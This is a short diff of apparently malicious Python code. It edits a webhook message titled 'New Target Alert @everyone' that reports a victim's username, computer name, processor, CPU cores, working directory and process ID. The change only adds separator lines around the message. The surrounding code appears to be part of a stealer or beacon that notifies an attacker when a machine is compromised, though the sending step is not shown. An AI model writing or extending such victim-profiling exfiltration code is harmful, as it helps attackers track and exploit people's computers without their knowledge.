@@ -23,6 +23,7 @@ _home_directory = os.path.expanduser("~")
 _process_id = os.getpid()
 
 _webhook_lines = [
+    "**-----**",
     "[!] **New Target Alert @everyone**",
     f"[!] **User:** `{_username}`",
     f"[!] **Computer:** `{_computer_name}`",
@@ -31,7 +32,8 @@ _webhook_lines = [
     f"[!] **Processor:** `{_processor}`",
     f"[!] **CPU Cores:** `{_cpu_count}`",
     f"[!] **Working Directory:** `{_current_directory}`",
-    f"[!] **Process ID:** `{_process_id}`"
+    f"[!] **Process ID:** `{_process_id}`",
+    "**-----**"
 ]
 _webhook_content = "\n".join(_webhook_lines)
 
